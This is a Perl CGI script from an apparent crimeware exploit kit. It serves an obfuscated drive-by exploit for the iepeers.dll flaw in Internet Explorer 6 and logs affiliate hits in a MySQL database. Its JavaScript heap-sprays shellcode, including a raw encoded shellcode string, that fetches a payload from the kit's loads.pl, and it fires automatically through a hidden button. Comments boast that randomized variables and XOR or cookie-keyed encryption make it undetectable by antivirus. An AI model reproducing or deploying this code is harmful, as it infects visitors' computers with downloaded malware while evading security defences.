#!/usr/bin/perl

#
# var randomizer for iepeers.dll exploit (Windows XP SP0-SP3 / IE 6.0 SP0-2)
# TESTED XP IE6 SP2 (WORKING)
# TESTED XP IE6 SP3 (WORKING)
# TESTED XP IE7 SP2 (NOT WORKING / DOS)
# TESTED 2003 IE7 SP2 (NOT WORKING / DOS)
# FUD for all AV using random XOR + random Vars + Replace string of eval
#

use CGI;
use DBI;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../lib/EncRand.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET iepeers=iepeers+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$q = new CGI;

$aff = $q->param('aff');
$csname = $q->param('csname');

#Insert the view param on exploit
$sql = "UPDATE exploits SET iepeers=iepeers+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#get the cookie value from name
$theCookie = $q->cookie($csname);

#randomize vars
$j_shellcode  = JsXOR::generate_random_string(int(rand 100));
$j_nops       = JsXOR::generate_random_string(int(rand 100));
$j_slackspace = JsXOR::generate_random_string(int(rand 100));
$j_fillblock  = JsXOR::generate_random_string(int(rand 100));
$j_memory     = JsXOR::generate_random_string(int(rand 100));
$j_counter    = JsXOR::generate_random_string(int(rand 30));
$j_ret        = JsXOR::generate_random_string(int(rand 100));
$j_array      = JsXOR::generate_random_string(int(rand 100));
$j_function1  = JsXOR::generate_random_string(int(rand 100));
$j_function2  = JsXOR::generate_random_string(int(rand 100));
$j_object     = JsXOR::generate_random_string(int(rand 100));
$j_id         = JsXOR::generate_random_string(int(rand 100));

#exec code vars
$ret = '%u0c0c%u0c0c';

#build shellcode
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=iepeers';
$shellcode = Shellcode::getshell($urlllll);
#$shellcode = '%ufd4f%ud6f5%u4042%u4298%u2f43%u9340%u4837%u4392%u4a37%u4940%uf846%u4f2f%u494e%u4390%u4efd%u4a41%u2f9b%ud649%u4a4e%u9940%u4349%u4037%u3797%u9f2f%u484e%ufc4e%u4a97%uf99b%u9740%uf9fc%u974a%u969f%u904f%ufc3f%u91f9%u4a4b%u4142%u404a%uf5f9%u4f37%u48d6%ufd4a%uf537%u2f9f%uf54b%uf848%u4296%u9ff9%u90f8%u3799%uf59f%u4940%u4a4b%u49d6%u4a41%u9796%u9190%u4049%u464b%u4a90%u2ffc%uf94b%u4697%u9742%u4793%u479b%u3ffc%u93d6%u3797%u4237%u4849%uf599%uf896%ud6f9%u9091%u3796%u9799%u3f90%u91f9%u9297%u4949%u9f49%u4ffc%u979f%u3f41%u924a%u9048%u4797%ufd47%u48f5%u9b91%u4f4b%u4997%u4848%uf8fd%u429b%u4899%u4243%u4f40%u4041%u9146%u4046%u9040%u919f%u9891%u4096%uf991%u4140%uf592%u4747%u472f%u4841%uf54a%u4b91%u9392%uf598%u4afc%ud642%u48f9%u9242%u4e49%u3f98%u994e%u4849%u97f9%u9637%ufdf9%u9748%u4948%u9793%u91f8%u4198%ufcd6%u4897%u9391%u4940%u4792%u4396%uf5fc%u9198%u9392%u40fc%ud648%u41fc%u4f92%u4e91%u3f2f%u4790%ud6f8%u9190%u4899%uf8fc%uf943%ufc92%u4690%ufc47%u9b9f%ufdf9%u404f%u4396%u4747%u9240%u9f4b%u404a%u90f9%u37f9%u912f%u96d6%u9197%u4840%u9093%u9ff9%ufdf8%u48f8%u974f%u9fd6%u4b98%ufd47%u9742%u4648%uf546%u429f%u3f41%u90f9%ud690%u924e%u4bfd%u4397%u48f8%uf5d6%u4040%ufd2f%u37fc%u2f40%u3743%u4a9f%u47f8%u9646%u904a%u3f96%u464b%u994e%u90fc%u9693%u4e4e%u4040%u904f%u4298%u9b47%u4740%u49f9%u3f47%u9149%u4098%u4f4a%u4792%u9946%uf93f%ufd47%u4b96%u9847%u4392%u982f%u374f%u4af5%u914f%u49fc%u4037%u9f9f%u9292%u99f8%ud696%u9bd6%u494f%u9892%u9899%uf548%u4942%u4090%u9348%u464b%u409f%u4048%u9240%u9948%u96f8%u994f%u973f%u3f91%u989b%u934a%u40f8%u4a98%u2f47%u3740%u4191%u3f49%u43fc%uf840%u9293%u432f%u9293%u4799%u4e46%u414a%ud6f5%u4a41%u4a41%u4f47%u4f4f%u4843%u4396%u923f%u409b%ud697%u40f8%u91f8%u96fc%ufd48%u9997%ufd97%ud640%ufd48%u4748%u97f8%u902f%u3f49%ufc4a%u9640%uf9fd%u499b%u4e99%u9ff5%ufc3f%u9037%ufcf5%u4896%u4042%ufdf9%u3f46%u99f9%u4197%u9241%u924b%ufc96%u9847%u924e%u9f90%uf898%uda40%ud9c0%u2474%ub8f4%u601a%u1bb0%u2b5a%ub1c9%u315f%u1942%u4203%u8319%u04c2%u95f8%udf31%ua7a8%u1fcd%u58bb%uaa68%u9008%u93ea%u2352%ud773%ubaa0%ue291%ub95f%uf8bd%u3d60%u8fc2%u5bd2%ue9a4%ua629%ua0ef%uc034%ua189%u669f%u2cbb%ubd9a%u77ae%uaf35%u958f%u75df%u771d%u9798%uedb8%ub0b4%u6b04%u2cda%u01a0%u25b0%ud481%ud70c%u73bb%ucaee%u70a8%u2a79%u4844%u3a68%u7059%u6368%ua1c7%uebf7%u9f37%u1ec0%u32ec%ua311%u6996%ua4e5%ud53c%u045f%uf4be%ub70e%u7c9f%ue2aa%u0747%u8851%ue520%u37fc%u1b8a%u559d%u0645%ucd3e%u7f8b%u6c33%u0e6b%u167a%u68f5%u7666%u4092%uee59%u3354%ufda6%u4f29%uc2b0%u0bdb%u5b59%u4e82%ud606%ub17a%u41a1%ua29d%u94b2%u2331%ubdf3%ued38%u84e9%ub431%u61c7%ub278%uf089%uf81e%ubccd%u5de3%u59f0%u8386%uc7f6%ue920%u315f%u249b%u0890%u777a%u994b%u4ec6%ufb59%u3906%u6294%ud759%u328c%u3450%u2889%u8cfa%u7ee2%u6a31%u43bf%u4106%u3344%uff2d%ucae0%u668e%u4b72%u9a2f%u5a97%u9524%u859d%ua746%uca8a%ub253%uedd5%uae58%uf12f%udc4b%u0653%uef56%u1b40%ufd93%u0f60%u2684%u1e15%u20b5%u7ef9%u35ca%u5d98%u3ad2%u9077%u50e4%ud37b%u3efa%ud256%ubcfd%ueb8d%ud505%ue7d5%uf21a%u14bc%uf631%u124a%u6031%u107e%u4e6b%u4988%u8463%u6e82%uaa71%u509c%uc07a%ub79c%u43e2%u3c28%uae65%u93ff%ua7e8%uc693%u5280%u3708%uf206%u68a3%u64bc%u0452%u0655%u82d0%uc6c0%u2b7d%u976e';

#script DATA
my $scriptdata = <<SCREOF;

function $j_function1(){

 var $j_shellcode = unescape('$shellcode');

 $j_memory = new Array();

 var $j_slackspace = 0x86000-($j_shellcode.length*2);

 var $j_nops = unescape('$ret');

 while($j_nops.length<$j_slackspace/2) { $j_nops+=$j_nops; }

 var $j_fillblock = $j_nops.substring(0,$j_slackspace/2);

 delete $j_nops;

 for($j_counter=0; $j_counter<270; $j_counter++) {

  $j_memory\[$j_counter\] = $j_fillblock + $j_fillblock + $j_shellcode;

 }

}

function $j_function2(){

 $j_function1();

 var $j_object = document.createElement('body');

 $j_object.addBehavior('#default#userData');

 document.appendChild($j_object);

 try {

  for ($j_counter=0; $j_counter<10; $j_counter++) {

	$j_object.setAttribute('s',window);

  }

 } catch(e){ }

 window.status+='';
 
}

document.getElementById('$j_id').onclick();

SCREOF

#HTML DATA
my $data = <<EOF;

<html><body>

<button id='$j_id' onclick='$j_function2();' style='display:none'></button>

<script language="JavaScript">

EOF

#$beforexoredd = JsXOR::excryptxorjs($scriptdata);
$beforexoredd = EncRand::CsCrypt($scriptdata,$csname,$theCookie);

#$beforexoredd = $scriptdata;

###### BEGIN PRINT EXPLOIT #########
print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');

print "$data";

print $beforexoredd;

print '</script></body></html>';

####### END PRINT EXPLOIT ##########

$dbh->disconnect();

1;
